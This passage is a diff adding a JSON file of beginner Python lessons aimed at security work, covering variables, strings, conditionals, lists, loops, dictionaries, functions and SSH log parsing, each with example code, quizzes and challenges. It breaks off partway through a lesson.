@@ -1,0 +1,3216 @@
+{
+ "levels": [
+  {
+   "name": "Basics",
+   "from": 0,
+   "to": 8
+  },
+  {
+   "name": "Security scripts",
+   "from": 8,
+   "to": 18
+  },
+  {
+   "name": "Tools and projects",
+   "from": 18,
+   "to": 24
+  },
+  {
+   "name": "PowerShell for defenders",
+   "from": 24,
+   "to": 34
+  }
+ ],
+ "lessons": [
+  {
+   "t": "print and variables",
+   "sub": "Why security people use Python, and how to store a value.",
+   "learn": [
+    [
+     "Key terms",
+     "Script: a short program saved in a file that automates a task.\nInterpreter: the program that reads your Python code and runs it.\nVariable: a name that stores a value so you can use it later.\nComment: a note in your code that Python ignores."
+    ],
+    [
+     "Why Python",
+     "Python is one of the most popular scripting languages in security. Analysts use it to read logs, automate checks and connect tools. They also call application programming interfaces (APIs), which let programs ask other systems for data. Kali already has Python 3 installed."
+    ],
+    [
+     "Two ways to run it",
+     "You can run Python in two ways. Type `python3` to open the interactive prompt, where you try one line at a time. Leave it with `exit()`. Or save your code in a file ending in .py, then run `python3 hello.py`."
+    ],
+    [
+     "print and comments",
+     "`print()` shows output on screen. Python ignores anything after `#`, so you can use it to write a comment. Use comments to explain why the code does something, not what it does.",
+     "# Say hello to the SOC\nprint(\"Hello, SOC\")\nprint(2 + 3)"
+    ],
+    [
+     "Variables",
+     "A variable is a name for a value. You create one with `=`, which assigns the value to the name. Choose names that say what the value is, like `target_ip`, not `x`.",
+     "target_ip = \"10.10.10.20\"\nport = 445\nprint(target_ip, port)"
+    ],
+    [
+     "The core types",
+     "Every value has a type, which is the kind of value it is. `str` is text, `int` is a whole number, `float` has a decimal point and `bool` is True or False. `type()` tells you which one you have."
+    ]
+   ],
+   "play": {
+    "p": "Change the message and the port, then tap Run.",
+    "code": "host = \"10.10.10.20\"\nport = 445\nprint(\"Checking\", host, \"on port\", port)"
+   },
+   "real": [
+    "On the job",
+    "A security operations centre (SOC) analyst gets 2,000 alerts exported to a file. Reading them by hand takes a day. A 15-line script sorts and counts them in a second. That's why so many security job ads mention Python."
+   ],
+   "myth": [
+    "You have to be a programmer to use Python in security.",
+    "Most security scripts are short. They read something, filter it, count it and print it. You'll write useful ones by the end of this track."
+   ],
+   "tryit": {
+    "h": "Run a script",
+    "where": "Kali terminal",
+    "p": "Create a file, run it, then change the message and run it again.",
+    "code": "echo 'print(\"Hello from Kali\")' > hello.py\npython3 hello.py"
+   },
+   "quiz": [
+    {
+     "d": 1,
+     "run": true,
+     "q": "What does this print?",
+     "code": "print(2 + 3)\n# print(10)",
+     "o": [
+      "2 + 3",
+      "5",
+      "10"
+     ],
+     "k": 1,
+     "w": "5. The second line is a comment, so only `print(2 + 3)` runs. Not 2 + 3: print shows the result, not the sum as written. Not 10: Python ignores the commented line."
+    },
+    {
+     "d": 2,
+     "run": true,
+     "q": "What does this print?",
+     "code": "print(type(3.0))",
+     "o": [
+      "3",
+      "<class 'int'>",
+      "<class 'float'>"
+     ],
+     "k": 2,
+     "w": "<class 'float'>. The decimal point makes it a float, even though the value is a whole number. Not int: 3.0 has a decimal point. Not 3: `type()` gives the type, not the value."
+    },
+    {
+     "d": 1,
+     "q": "How do you run a script saved as scan.py?",
+     "o": [
+      "run scan.py",
+      "print scan.py",
+      "python3 scan.py"
+     ],
+     "k": 2,
+     "w": "python3 scan.py. Give the file to the python3 interpreter, which runs it. Not run or print: neither of these starts the Python interpreter."
+    }
+   ],
+   "challenge": {
+    "p": "Set `target` to `\"win10\"`, then print `Target: win10`.",
+    "start": "target = \"\"\nprint(\"Target:\", target)",
+    "hint": "Put the text between the quotes on the first line.",
+    "solution": "target = \"win10\"\nprint(\"Target:\", target)",
+    "expect": "Target: win10"
+   },
+   "recap": [
+    "Python is one of the most popular scripting languages in security.",
+    "Run it with `python3` or `python3 file.py`.",
+    "`print()` shows output; `#` starts a comment.",
+    "Assign with `=` and use descriptive names.",
+    "`type()` shows whether a value is str, int, float or bool."
+   ]
+  },
+  {
+   "t": "Strings and f-strings",
+   "sub": "Text, numbers, and building readable output.",
+   "learn": [
+    [
+     "Key terms",
+     "String: a piece of text, such as a username or a log line.\nInteger: a whole number, such as a port number.\nf-string: a string with an f before the quotes, which fills in values from braces."
+    ],
+    [
+     "Text isn't a number",
+     "Anything you read from a file, a log or user input arrives as text. Adding text joins it, so \"22\" + \"1\" gives \"221\". Convert with `int()` before doing maths."
+    ],
+    [
+     "Converting",
+     "`int(\"22\")` turns text into a number, and `str(22)` turns a number into text. Converting text that isn't a number, like `int(\"ssh\")`, raises a ValueError."
+    ],
+    [
+     "f-strings",
+     "Put an f before the opening quote. Python then replaces any variable inside braces with its value. f-strings are the clearest way to build output and messages.",
+     "ip = \"10.10.10.20\"\nopen_ports = 3\nprint(f\"{ip} has {open_ports} open ports\")"
+    ]
+   ],
+   "play": {
+    "p": "Edit the values and run it again. Then try a calculation inside the braces.",
+    "code": "ip = \"10.10.10.20\"\nopen_ports = 3\nprint(f\"{ip} has {open_ports} open ports\")\nprint(f\"Next port: {22 + 1}\")"
+   },
+   "real": [
+    "On the job",
+    "A firewall export lists ports as text. A script that checks `\"80\" > \"443\"` says True. Text compares one character at a time, and 8 comes after 4. As numbers, 80 > 443 is False, so converting to int first fixes it."
+   ],
+   "myth": [
+    "Python works out what you meant, so types don't matter.",
+    "Python won't guess. Mixing text and numbers either raises an error or quietly gives the wrong result."
+   ],
+   "tryit": {
+    "h": "Try types in the prompt",
+    "where": "Kali: run python3",
+    "p": "Type each line into the Python prompt and predict the result before you press Enter.",
+    "code": "type(22)\ntype(\"22\")\n\"22\" + \"1\"\nint(\"22\") + 1"
+   },
+   "quiz": [
+    {
+     "d": 1,
+     "run": true,
+     "q": "What does this print?",
+     "code": "port = \"22\"\nprint(port + \"1\")",
+     "o": [
+      "23",
+      "221",
+      "An error"
+     ],
+     "k": 1,
+     "w": "221. Both values are text, so `+` joins them. Not 23: that needs `int()` to turn the text into a number first. Not an error: joining two strings is allowed."
+    },
+    {
+     "d": 2,
+     "run": true,
+     "q": "What does this print?",
+     "code": "port = \"22\"\nprint(int(port) + 1)",
+     "o": [
+      "23",
+      "221",
+      "An error"
+     ],
+     "k": 0,
+     "w": "23. `int()` converts the text to a number first, so this is real addition. Not 221: that's what joining two strings gives. Not an error: \"22\" is valid number text, so the conversion works."
+    },
+    {
+     "d": 1,
+     "run": true,
+     "q": "What does this print?",
+     "code": "ip = \"10.10.10.20\"\nprint(f\"Scanning {ip}\")",
+     "o": [
+      "Scanning {ip}",
+      "f\"Scanning {ip}\"",
+      "Scanning 10.10.10.20"
+     ],
+     "k": 2,
+     "w": "Scanning 10.10.10.20. The f prefix fills in the braces with the variable's value. Not Scanning {ip}: you'd only see the braces without the f. Not the version with the f and quotes: print shows the text, not the code."
+    }
+   ],
+   "challenge": {
+    "p": "The log gives the port as text. Add 1 to it as a number, then use an f-string to print `next port: 23`.",
+    "start": "port = \"22\"\nprint(f\"next port: {port}\")",
+    "hint": "Convert with `int(port)` inside the braces.",
+    "solution": "port = \"22\"\nprint(f\"next port: {int(port) + 1}\")",
+    "expect": "next port: 23"
+   },
+   "recap": [
+    "Input from files, logs and users arrives as text.",
+    "Convert with `int()` and `str()` before mixing.",
+    "f-strings put values inside `{}`.",
+    "You can do maths inside the braces."
+   ]
+  },
+  {
+   "t": "if, elif and else",
+   "sub": "Make decisions in code.",
+   "learn": [
+    [
+     "Key terms",
+     "Condition: a check that is either True or False.\nBlock: the indented lines that belong to an if, a loop or a function.\nBranch: one of the paths code can take, such as the if or the else.\nIndentation: spaces at the start of a line that show which block it belongs to."
+    ],
+    [
+     "if, elif, else",
+     "An if runs its block only when its condition is true. elif checks the next condition, and else catches everything left. Only the first matching branch runs.",
+     "fails = 7\nif fails > 10:\n    print(\"block\")\nelif fails > 5:\n    print(\"warn\")\nelse:\n    print(\"ok\")"
+    ],
+    [
+     "Comparisons",
+     "`==` means equal and `!=` means not equal. `<`, `>`, `<=` and `>=` compare numbers. Combine conditions with `and`, `or` and `not`."
+    ],
+    [
+     "Indentation is syntax",
+     "Python groups code by indentation, not braces. Lines inside an if or a loop are indented, usually by four spaces. Python needs the indentation to be consistent. Getting it wrong is an error, not a style issue.",
+     "if 2 > 1:\n    print(\"indented, so inside the if\")\nprint(\"back outside\")"
+    ]
+   ],
+   "play": {
+    "p": "Change `fails` to 2, 6 and 12 and see which branch runs.",
+    "code": "fails = 7\nif fails > 10:\n    print(\"block\")\nelif fails > 5:\n    print(\"warn\")\nelse:\n    print(\"ok\")"
+   },
+   "real": [
+    "On the job",
+    "Every alert rule is an if statement underneath. For example, if failed logins from one IP go over a threshold in five minutes, raise an alert. Tuning that threshold is a daily job in a security operations centre (SOC)."
+   ],
+   "myth": [
+    "`=` and `==` mean the same thing.",
+    "`=` stores a value; `==` compares two values. Writing `if fails = 5:` is a syntax error in Python."
+   ],
+   "quiz": [
+    {
+     "d": 1,
+     "run": true,
+     "q": "What does this print?",
+     "code": "fails = 3\nif fails > 10:\n    print(\"block\")\nelif fails > 5:\n    print(\"warn\")\nelse:\n    print(\"ok\")",
+     "o": [
+      "ok",
+      "warn",
+      "block"
+     ],
+     "k": 0,
+     "w": "ok. 3 isn't over 5 or 10, so the else branch runs. Not warn or block: those need more than 5 or 10."
+    },
+    {
+     "d": 2,
+     "q": "What happens when you run this?",
+     "code": "if True:\nprint(\"hi\")",
+     "o": [
+      "It prints hi",
+      "It prints nothing",
+      "An IndentationError"
+     ],
+     "k": 2,
+     "w": "An IndentationError. The body of an if must be indented, so Python refuses to run the file. Not hi or nothing: Python stops before it runs any line."
+    },
+    {
+     "d": 2,
+     "q": "What does this print?",
+     "run": true,
+     "code": "role = \"admin\"\nif role == \"admin\":\n    print(\"admin\")\nelse:\n    print(\"user\")",
+     "o": [
+      "user",
+      "admin",
+      "Nothing"
+     ],
+     "k": 1,
+     "w": "admin. `role` equals \"admin\", so the `==` check is True and the first branch runs. Not user: else only runs when the check is False. Not nothing: with an else, one branch runs."
+    }
+   ],
+   "challenge": {
+    "p": "`cvss` holds a Common Vulnerability Scoring System (CVSS) score from 0 to 10. Print `high` if it's 7.0 or more, otherwise print `low`.",
+    "start": "cvss = 8.1\n",
+    "hint": "Use `if cvss >= 7.0:` with an `else:`. Indent each print by four spaces.",
+    "solution": "cvss = 8.1\nif cvss >= 7.0:\n    print(\"high\")\nelse:\n    print(\"low\")",
+    "expect": "high"
+   },
+   "recap": [
+    "if, elif and else choose one branch.",
+    "`==` compares; `=` assigns.",
+    "Combine conditions with and, or and not.",
+    "Indentation decides what's inside the if.",
+    "Rules and alerts are conditions underneath."
+   ]
+  },
+  {
+   "t": "Lists",
+   "sub": "Keep many values in order.",
+   "learn": [
+    [
+     "Key terms",
+     "List: an ordered collection of items inside square brackets.\nIndex: an item's position in a list, counting from 0.\nSlice: a part of a list, picked out by a start and an end position."
+    ],
+    [
+     "Lists",
+     "A list holds items in order, inside square brackets. You get an item by its index, which starts at 0.",
+     "ports = [22, 80, 443]\nprint(ports[0], ports[2])"
+    ],
+    [
+     "Changing a list",
+     "`.append(x)` adds an item to the end. `.remove(x)` takes out the first item that matches. `len(ports)` tells you how many items there are.",
+     "ports = [22, 80]\nports.append(443)\nports.remove(80)\nprint(ports, len(ports))"
+    ],
+    [
+     "Slicing",
+     "`ports[0:2]` gives the first two items. The start is included and the end isn't. You'll see the same rule with `range` in the next lesson.",
+     "ports = [21, 22, 80, 443]\nprint(ports[0:2], ports[-1])"
+    ],
+    [
+     "Counting from the end",
+     "A negative index counts back from the end of the list. `ports[-1]` is the last item."
+    ]
+   ],
+   "play": {
+    "p": "Add another port to the list, then print the last one.",
+    "code": "ports = [22, 80, 443]\nports.append(3389)\nprint(ports)\nprint(\"last:\", ports[-1])"
+   },
+   "real": [
+    "On the job",
+    "A scanner reports the open ports on each host as a list. You compare that list with the ports you expect. Then you append anything unexpected to a findings list. This is a daily vulnerability management job."
+   ],
+   "myth": [
+    "The first item in a list is item 1.",
+    "Python counts from 0, so `ports[0]` is the first item and `ports[1]` is the second."
+   ],
+   "quiz": [
+    {
+     "d": 1,
+     "run": true,
+     "q": "What does this print?",
+     "code": "ports = [22, 80, 443]\nprint(ports[1])",
+     "o": [
+      "22",
+      "80",
+      "443"
+     ],
+     "k": 1,
+     "w": "80. Index 1 is the second item, because counting starts at 0. Not 22: that's index 0. Not 443: that's index 2."
+    },
+    {
+     "d": 1,
+     "q": "What does this print?",
+     "run": true,
+     "code": "ports = [22, 80, 443]\nports.remove(80)\nprint(ports)",
+     "o": [
+      "[22, 443]",
+      "[80, 443]",
+      "[22, 80, 443]"
+     ],
+     "k": 0,
+     "w": "[22, 443]. `.remove(80)` takes 80 out, leaving 22 and 443. Not [80, 443]: remove takes out the value you give it, not the first item. Not [22, 80, 443]: the list does change."
+    },
+    {
+     "d": 2,
+     "q": "What does this print?",
+     "run": true,
+     "code": "ports = [21, 22, 80, 443]\nprint(ports[0:2])",
+     "o": [
+      "[21, 22]",
+      "[22, 80]",
+      "[21, 22, 80]"
+     ],
+     "k": 0,
+     "w": "[21, 22]. The slice starts at index 0 and stops before index 2. Not [22, 80]: the start index is included, and index 0 is 21. Not [21, 22, 80]: the end index isn't included."
+    }
+   ],
+   "challenge": {
+    "p": "Add 3389 to the list, then print how many ports there are.",
+    "start": "ports = [22, 80, 443]\n",
+    "hint": "Use `.append(3389)` then `print(len(ports))`.",
+    "solution": "ports = [22, 80, 443]\nports.append(3389)\nprint(len(ports))",
+    "expect": "4"
+   },
+   "recap": [
+    "Lists hold ordered items.",
+    "Indexes start at 0.",
+    "`.append()` adds; `.remove()` takes out.",
+    "Slices include the start, not the end.",
+    "Index -1 is the last item."
+   ]
+  },
+  {
+   "t": "Loops",
+   "sub": "Do the same thing to every item.",
+   "learn": [
+    [
+     "Key terms",
+     "Loop: code that repeats a block, such as once for each host or log line.\nrange: a built-in that produces a run of whole numbers.\nFiltering: keeping only the items that match a condition."
+    ],
+    [
+     "for loops",
+     "A for loop runs its indented block once for each item. This is how you check every host, every port or every log line.",
+     "for port in [22, 80, 443]:\n    print(\"checking\", port)"
+    ],
+    [
+     "Keeping a count",
+     "To keep a running count, write `count += 1` inside the loop. It's short for `count = count + 1`."
+    ],
+    [
+     "range",
+     "`range(1, 5)` produces 1, 2, 3 and 4. It's handy for port ranges and counting."
+    ],
+    [
+     "Filtering as you go",
+     "Combine a loop and an if to keep only what matters. Build a new list of the matches, then work with that list.",
+     "ports = [21, 22, 23, 80, 443]\nrisky = []\nfor p in ports:\n    if p in (21, 23):\n        risky.append(p)\nprint(risky)"
+    ]
+   ],
+   "play": {
+    "p": "Change the list and the condition, then run it.",
+    "code": "ports = [21, 22, 23, 80, 443]\nfor p in ports:\n    if p in (21, 23):\n        print(p, \"is cleartext\")"
+   },
+   "real": [
+    "On the job",
+    "A vulnerability scanner returns 500 findings. A loop keeps only the critical ones on internet-facing hosts. That gives you a short list to fix first."
+   ],
+   "myth": [
+    "`range(1, 5)` includes 5.",
+    "The stop value is excluded, so `range(1, 5)` gives 1 to 4. For ports 1 to 1024, write `range(1, 1025)`."
+   ],
+   "tryit": {
+    "h": "Loop over hosts",
+    "where": "Kali: python3",
+    "p": "Loop over your lab addresses and print a line for each. Then change it to skip the Kali address (10.10.10.10).",
+    "code": "hosts = [\"10.10.10.10\", \"10.10.10.20\"]\nfor h in hosts:\n    print(\"would scan\", h)"
+   },
+   "quiz": [
+    {
+     "d": 2,
+     "run": true,
+     "q": "What does this print?",
+     "code": "print(list(range(1, 4)))",
+     "o": [
+      "[1, 2, 3]",
+      "[0, 1, 2, 3]",
+      "[1, 2, 3, 4]"
+     ],
+     "k": 0,
+     "w": "[1, 2, 3]. The start is included and the stop is not. Not [0, 1, 2, 3]: this range starts at 1, not 0. Not [1, 2, 3, 4]: 4 is the stop value, so it's left out."
+    },
+    {
+     "d": 2,
+     "run": true,
+     "q": "What does this print?",
+     "code": "total = 0\nfor n in [3, 4, 5]:\n    total = total + n\nprint(total)",
+     "o": [
+      "5",
+      "12",
+      "345"
+     ],
+     "k": 1,
+     "w": "12. The loop adds each number to the running total: 3, then 7, then 12. Not 5: that's only the last number. Not 345: these are numbers, so they're added, not joined like text."
+    },
+    {
+     "d": 2,
+     "q": "What does this print?",
+     "run": true,
+     "code": "count = 0\nfor n in range(1, 4):\n    count += 1\nprint(count)",
+     "o": [
+      "1",
+      "2",
+      "3"
+     ],
+     "k": 2,
+     "w": "3. The loop runs for 1, 2 and 3, adding 1 to `count` each time. Not 1 or 2: the range gives three numbers, so the loop runs three times."
+    }
+   ],
+   "challenge": {
+    "p": "Loop over the list and print only the ports below 1024, one per line.",
+    "start": "ports = [22, 8080, 443, 3389, 80]\n",
+    "hint": "Use `for p in ports:` and inside it `if p < 1024:`.",
+    "solution": "ports = [22, 8080, 443, 3389, 80]\nfor p in ports:\n    if p < 1024:\n        print(p)",
+    "expect": "22\n443\n80"
+   },
+   "recap": [
+    "for loops run once per item.",
+    "`count += 1` adds one each time round.",
+    "`range(a, b)` stops before b.",
+    "A loop plus an if filters a list."
+   ]
+  },
+  {
+   "t": "Dictionaries",
+   "sub": "Look things up by name.",
+   "learn": [
+    [
+     "Key terms",
+     "Dictionary: a collection that maps keys to values, inside curly braces.\nKey: the name you use to look up a value in a dictionary.\nKeyError: the error Python raises when you look up a key that isn't there.\nJavaScript Object Notation (JSON): a text format for structured, nested data."
+    ],
+    [
+     "Dictionaries",
+     "A dictionary maps keys to values, inside curly braces. You look up a value by its key. It works like the Domain Name System (DNS), which looks up an address by name.",
+     "services = {22: \"ssh\", 80: \"http\", 443: \"https\"}\nprint(services[443])"
+    ],
+    [
+     "Safe lookups",
+     "Looking up a missing key with square brackets raises a KeyError. `.get(key, default)` returns the default instead. That's safer with messy data."
+    ],
+    [
+     "Counting by hand",
+     "To count things, add 1 to a key's value each time you see that key. Use `.get()` to start missing keys at 0.",
+     "counts = {}\nfor ip in [\"1.1.1.1\", \"2.2.2.2\", \"1.1.1.1\"]:\n    counts[ip] = counts.get(ip, 0) + 1\nprint(counts)"
+    ]
+   ],
+   "play": {
+    "p": "Add another service, then look up one that isn't there.",
+    "code": "services = {22: \"ssh\", 80: \"http\", 443: \"https\"}\nprint(services[443])\nprint(services.get(3389, \"unknown\"))"
+   },
+   "real": [
+    "On the job",
+    "Once parsed, JavaScript Object Notation (JSON) data from a security application programming interface (API) becomes Python dictionaries. Knowing how to reach `alert[\"src\"][\"ip\"]` reliably is a core skill in automation scripts."
+   ],
+   "myth": [
+    "Dictionaries are only for advanced code.",
+    "They're one of the most useful beginner tools. Look-up tables, counts and JSON data read into Python are all dictionaries."
+   ],
+   "quiz": [
+    {
+     "d": 1,
+     "run": true,
+     "q": "What does this print?",
+     "code": "services = {22: \"ssh\", 80: \"http\"}\nprint(services.get(443, \"unknown\"))",
+     "o": [
+      "None",
+      "unknown",
+      "A KeyError"
+     ],
+     "k": 1,
+     "w": "unknown. 443 isn't a key, so `.get()` returns the default you gave it. Not None: that's only returned when you give no default. Not a KeyError: only square brackets raise that."
+    },
+    {
+     "d": 2,
+     "q": "Why use `counts.get(ip, 0) + 1` instead of `counts[ip] + 1`?",
+     "o": [
+      "It runs faster",
+      "It sorts the dictionary",
+      "A new IP isn't a key yet"
+     ],
+     "k": 2,
+     "w": "A new IP isn't a key yet. Square brackets on a missing key raise a KeyError. `.get` starts new keys at 0. Not speed or sorting: `.get` does neither."
+    },
+    {
+     "d": 2,
+     "run": true,
+     "q": "What does this print?",
+     "code": "services = {22: \"ssh\"}\ntry:\n    print(services[80])\nexcept KeyError:\n    print(\"KeyError\")",
+     "o": [
+      "None",
+      "unknown",
+      "KeyError"
+     ],
+     "k": 2,
+     "w": "KeyError. Square brackets raise KeyError for a missing key, and the except block prints that text. Not None or unknown: only `.get()` returns a default."
+    }
+   ],
+   "challenge": {
+    "p": "Count how many times each user appears and print the dictionary.",
+    "start": "users = [\"root\", \"admin\", \"root\"]\ncounts = {}\n",
+    "hint": "Loop over `users` and use `counts[u] = counts.get(u, 0) + 1`.",
+    "solution": "users = [\"root\", \"admin\", \"root\"]\ncounts = {}\nfor u in users:\n    counts[u] = counts.get(u, 0) + 1\nprint(counts)",
+    "expect": "{'root': 2, 'admin': 1}"
+   },
+   "recap": [
+    "A dictionary maps keys to values.",
+    "`.get(key, default)` avoids KeyErrors.",
+    "Count with `.get(k, 0) + 1`.",
+    "API data usually arrives as dictionaries."
+   ]
+  },
+  {
+   "t": "Functions",
+   "sub": "Package code you'll reuse.",
+   "learn": [
+    [
+     "Key terms",
+     "Function: a named block of code that you can run again and again.\nParameter: a name in a function's brackets that receives a value when the function is called.\nReturn value: the result a function sends back with return.\nDefault value: the value a parameter uses when the caller leaves it out."
+    ],
+    [
+     "Functions",
+     "`def` defines a function, which is a named block you can call again and again. Parameters go in the brackets. `return` sends a result back to the caller.",
+     "def is_admin_port(port):\n    return port in (22, 3389, 5985)\n\nprint(is_admin_port(3389))"
+    ],
+    [
+     "Why functions matter",
+     "Functions stop you copying code around. Fix a bug once, and every caller gets the fix. Functions also make scripts easier to test and read."
+    ],
+    [
+     "Parameters and defaults",
+     "A parameter can have a default value, as in `def check(port, timeout=1):`. Callers can leave it out, or pass their own value.",
+     "def check(port, timeout=1):\n    return f\"port {port}, timeout {timeout}\"\n\nprint(check(22))\nprint(check(22, 5))"
+    ]
+   ],
+   "play": {
+    "p": "Change the threshold, or call the function with different numbers.",
+    "code": "def suspicious(fails, threshold=5):\n    return fails > threshold\n\nprint(suspicious(3))\nprint(suspicious(8))\nprint(suspicious(8, threshold=10))"
+   },
+   "real": [
+    "On the job",
+    "Detection rules work like functions. Given an event, they return True if it's suspicious. Small functions like `is_off_hours(timestamp)` are exactly how logic is built in security information and event management (SIEM) tools. The same goes for security orchestration, automation and response (SOAR) tools."
+   ],
+   "myth": [
+    "A function that prints a result returns it too.",
+    "Printing shows a value on screen. Returning hands it back to the caller. A function without return gives back None."
+   ],
+   "tryit": {
+    "h": "Write a tiny rule",
+    "where": "Kali: python3",
+    "p": "Write a function that flags a login as suspicious after more than five failures. Then test it with a few values.",
+    "code": "def suspicious(fails):\n    return fails > 5\n\nfor n in [2, 6, 11]:\n    print(n, suspicious(n))"
+   },
+   "quiz": [
+    {
+     "d": 2,
+     "run": true,
+     "q": "What does this print?",
+     "code": "def risk(likelihood, impact):\n    return likelihood * impact\n\nprint(risk(3, 4))",
+     "o": [
+      "7",
+      "12",
+      "34"
+     ],
+     "k": 1,
+     "w": "12. The function multiplies the two values passed in and returns 12. Not 7: that's 3 plus 4, but the code multiplies. Not 34: these are numbers, so they aren't joined like text."
+    },
+    {
+     "d": 3,
+     "q": "What does this print?",
+     "code": "def check(port):\n    print(\"checked\", port)\n\nresult = check(22)\nprint(result)",
+     "o": [
+      "None only",
+      "checked 22, then 22",
+      "checked 22, then None"
+     ],
+     "k": 2,
+     "w": "checked 22, then None. The function prints but never returns, so `result` is None. Not 22: printing a value doesn't return it. Not None only: the print inside the function still runs first."
+    },
+    {
+     "d": 2,
+     "q": "What does this print?",
+     "run": true,
+     "code": "def check(port, timeout=1):\n    return f\"port {port}, timeout {timeout}\"\n\nprint(check(22))",
+     "o": [
+      "An error",
+      "port 22, timeout 1",
+      "port 22, timeout 5"
+     ],
+     "k": 1,
+     "w": "port 22, timeout 1. `timeout` wasn't passed, so it uses its default of 1. Not timeout 5: this call doesn't pass 5. Not an error: the default makes that parameter optional."
+    }
+   ],
+   "challenge": {
+    "p": "Write a function `is_admin_port(port)` that returns True for 22, 3389 and 5985. Then print `is_admin_port(3389)`.",
+    "start": "def is_admin_port(port):\n    pass\n\nprint(is_admin_port(3389))",
+    "hint": "Replace `pass` with `return port in (22, 3389, 5985)`.",
+    "solution": "def is_admin_port(port):\n    return port in (22, 3389, 5985)\n\nprint(is_admin_port(3389))",
+    "expect": "True"
+   },
+   "recap": [
+    "`def` packages code; `return` hands back a result.",
+    "Fix a bug once and every caller gets the fix.",
+    "Defaults make parameters optional.",
+    "A function without return gives back None.",
+    "Small functions make detection logic readable."
+   ]
+  },
+  {
+   "t": "String methods",
+   "sub": "Clean, split and search text.",
+   "learn": [
+    [
+     "Key terms",
+     "Method: a function that belongs to a value, called with a dot after the value.\nWhitespace: spaces, tabs and newlines.\nCase-sensitive: treating upper-case and lower-case letters as different."
+    ],
+    [
+     "String methods",
+     "Strings come with built-in methods. `.lower()` and `.upper()` change case. `.strip()` removes spaces and newlines from the ends. `.replace()` swaps one piece of text for another.",
+     "user = \"  Admin \\n\"\nprint(user.strip().lower())"
+    ],
+    [
+     "Split into parts",
+     "`.split()` breaks a string into a list of words. Give it a character, and it splits on that character instead. It's the quickest way to pull fields out of a log line.",
+     "line = \"Failed password for root from 10.0.0.5\"\nparts = line.split()\nprint(parts[-1])"
+    ],
+    [
+     "Searching",
+     "`in` checks whether text appears anywhere in a string. `.startswith()` and `.endswith()` check the start and the end. All of them are case-sensitive."
+    ]
+   ],
+   "play": {
+    "p": "Change the log line and see what each method gives you.",
+    "code": "line = \"  Failed password for ROOT from 10.0.0.5  \"\nclean = line.strip().lower()\nprint(clean)\nprint(clean.split()[-1])\nprint(clean.startswith(\"failed\"))"
+   },
+   "real": [
+    "On the job",
+    "Checking reported phishing emails often starts with string checks. Does the sender's domain end with your company's domain, or with a look-alike? A couple of `.endswith()` and `.lower()` calls handle that."
+   ],
+   "myth": [
+    "`in` and `==` do the same thing.",
+    "`==` needs an exact match. `in` finds text anywhere, so \"admin\" in \"sysadmin\" is True. That difference causes real filtering bugs."
+   ],
+   "tryit": {
+    "h": "Pull fields from a log line",
+    "where": "Kali: python3",
+    "p": "Split a realistic Secure Shell (SSH) log line, then print the user and IP address.",
+    "code": "line = \"Failed password for invalid user test from 10.10.10.10 port 51234 ssh2\"\nparts = line.split()\nprint(\"user:\", parts[5])\nprint(\"ip:\", parts[7])"
+   },
+   "quiz": [
+    {
+     "d": 2,
+     "run": true,
+     "q": "What does this print?",
+     "code": "line = \"Failed password for root\"\nprint(line.split()[2])",
+     "o": [
+      "for",
+      "root",
+      "password"
+     ],
+     "k": 0,
+     "w": "for. Counting starts at 0, so Failed is 0, password is 1 and for is 2. Not password: that's index 1. Not root: that's index 3."
+    },
+    {
+     "d": 1,
+     "run": true,
+     "q": "What does this print?",
+     "code": "print(\"admin\" in \"sysadmin\")",
+     "o": [
+      "True",
+      "False",
+      "An error"
+     ],
+     "k": 0,
+     "w": "True. `in` matches anywhere inside the string, which is easy to forget when filtering usernames. Not False: \"sysadmin\" contains \"admin\". Not an error: `in` works on any two strings."
+    },
+    {
+     "d": 1,
+     "q": "What does this print?",
+     "run": true,
+     "code": "sender = \"it@contoso.com\"\nprint(sender.endswith(\"@contoso.com\"))",
+     "o": [
+      "True",
+      "False",
+      "An error"
+     ],
+     "k": 0,
+     "w": "True. `.endswith` checks the end of the text exactly, and this address ends with @contoso.com. Not False or an error: the match is exact and valid. The `@` matters, because without it, `evilcontoso.com` would match too."
+    }
+   ],
+   "challenge": {
+    "p": "Print just the username from this log line, in lower case: `root`.",
+    "start": "line = \"Failed password for ROOT from 10.0.0.5\"\n",
+    "hint": "`.split()` gives a list of words. The username is at index 3. Then use `.lower()`.",
+    "solution": "line = \"Failed password for ROOT from 10.0.0.5\"\nprint(line.split()[3].lower())",
+    "expect": "root"
+   },
+   "recap": [
+    "`.strip()`, `.lower()` and `.split()` do most clean-up.",
+    "Split, then pick the part you need.",
+    "`.startswith()` and `.endswith()` check the start and end.",
+    "`in` matches anywhere; `==` needs an exact match."
+   ]
+  },
+  {
+   "t": "Parse a log: failed SSH logins",
+   "sub": "Count failed Secure Shell (SSH) logins in a realistic log.",
+   "learn": [
+    [
+     "Key terms",
+     "Parse: to pull useful fields out of text, such as a log line.\nwith statement: Python code that sets something up, such as an open file, and cleans it up when its block ends.\nNewline: the hidden character that ends each line of text."
+    ],
+    [
+     "Open files with with",
+     "`with open(path) as f:` opens a file. It closes the file automatically when the block ends, even if an error happens. Use it every time.",
+     "with open(\"ssh.log\") as f:\n    for line in f:\n        print(line.strip())"
+    ],
+    [
+     "Line by line",
+     "Looping over a file gives you one line at a time. Each line still ends with a newline. `.strip()` removes it before you print or compare the line."
+    ],
+    [
+     "Messy logs",
+     "Real logs contain odd characters. `open(path, errors=\"replace\")` swaps unreadable bytes for a placeholder. That stops the script crashing halfway through."
+    ],
+    [
+     "Practise on text first",
+     "Here, a sample log is stored in a variable. `.splitlines()` turns it into lines. On Kali you'd loop over an open file instead, and the loop body stays the same."
+    ]
+   ],
+   "play": {
+    "p": "The sample log is in `LOG`. Run it, then change what it counts, for example to `Accepted`.",
+    "code": "LOG = \"\"\"Nov 17 09:14:01 kali sshd[812]: Failed password for root from 203.0.113.7 port 50122 ssh2\nNov 17 09:14:05 kali sshd[812]: Failed password for root from 203.0.113.7 port 50124 ssh2\nNov 17 09:15:12 kali sshd[815]: Accepted publickey for kane from 10.10.10.10 port 51000 ssh2\nNov 17 09:16:40 kali sshd[818]: Failed password for invalid user admin from 198.51.100.23 port 40001 ssh2\nNov 17 09:16:44 kali sshd[818]: Failed password for root from 203.0.113.7 port 50130 ssh2\"\"\"\ncount = 0\nfor line in LOG.splitlines():\n    if \"Failed password\" in line:\n        count += 1\nprint(count, \"failed logins\")"
+   },
+   "real": [
+    "On the job",
+    "An incident responder receives a 2 GB web server log. Opening it in Notepad freezes the laptop. A Python loop reads it line by line and keeps only requests from the suspect IP. Then it writes them to a small file."
+   ],
+   "myth": [
+    "You must load the whole file before searching it.",
+    "Looping over the file object reads one line at a time. That's faster to start, and it works on files bigger than your random access memory (RAM)."
+   ],
+   "tryit": {
+    "h": "Count failed SSH logins",
+    "where": "Kali terminal",
